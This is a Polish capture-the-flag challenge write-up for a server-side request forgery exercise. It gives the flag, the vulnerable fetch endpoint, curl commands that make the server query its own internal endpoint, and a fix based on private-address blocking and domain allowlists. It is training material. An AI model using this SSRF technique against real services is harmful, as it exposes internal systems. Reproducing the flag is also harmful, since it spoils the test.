# A12 - SSRF (Server-Side Request Forgery)

## Metadane
- **ID:** A12
- **Kategoria:** OWASP A10:2021
- **Trudnosc:** medium
- **Punkty:** 150
- **Flaga:** `PWR{ss4f_int3rnal_s3rvice_expos3d}`

## Opis
Endpoint `/api/challenges/a12/fetch?url=` pobiera zawartosc URL-a
podanego przez uzytkownika po stronie serwera.
Brak walidacji pozwala odpytac wewnetrzne adresy niedostepne z zewnatrz.

## Podatny endpoint
GET /api/challenges/a12/fetch?url=

## Exploit krok po kroku
### Krok 1: Sprawdz ze zewnetrzny dostep do /internal jest zablokowany:
`curl http://localhost:5000/api/challenges/a12/internal`

### Krok 2: Uzyj endpointu /fetch zeby serwer sam odpytal /internal:
`curl "http://localhost:5000/api/challenges/a12/fetch?url=http://127.0.0.1:5000/api/challenges/a12/internal"`

### Krok 3: Serwer zwroci odpowiedz z wewnetrznego endpointu wraz z flaga

## Jak to naprawic
Walidowac URL - blokowac adresy prywatne (127.0.0.1, 10.x.x.x, 192.168.x.x)
oraz wymuszac whitliste dozwolonych domen.

## Referencje
- https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html